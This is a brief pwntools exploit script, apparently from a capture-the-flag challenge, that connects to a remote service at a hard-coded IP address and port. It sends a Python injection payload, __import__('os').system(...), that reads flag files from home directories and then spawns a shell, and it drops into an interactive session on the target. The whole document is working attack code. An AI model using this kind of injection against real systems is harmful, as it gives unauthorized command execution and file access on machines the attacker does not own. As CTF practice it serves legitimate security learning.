from pwn import *

p = remote("133.130.98.59", 1003)
p.sendline("__import__('os').system('cat /home/*/flag;sh')")
print p.recv()
p.interactive()
